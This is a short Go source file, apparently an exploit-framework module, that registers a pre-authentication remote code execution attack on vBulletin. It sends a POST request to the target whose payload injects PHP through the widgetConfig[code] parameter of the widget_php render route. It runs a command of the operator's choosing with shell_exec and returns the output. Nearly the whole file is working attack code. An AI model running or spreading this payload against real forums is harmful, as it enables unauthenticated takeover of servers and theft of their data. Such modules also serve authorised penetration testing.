package exp_vBulletin

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
)

type Exp_pre_auth_RCE struct {
	exp_templates.ExpTemplate
}

func (self *Exp_pre_auth_RCE) Attack_cmd1() (expResult exp_model.ExpResult) {
	// 构造payload
	headers := self.GetInitExpHeaders()

	data := "widgetConfig[code]echo shell_exec('%s'); exit;&routestring=ajax/render/widget_php"
	data = url.PathEscape(fmt.Sprintf(data, self.MustGetStringParam("cmd")))
	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

// func
func init() {
	exp_register.ExpStructRegister(&Exp_pre_auth_RCE{}, "exp_pre_auth_RCE.yml")
}
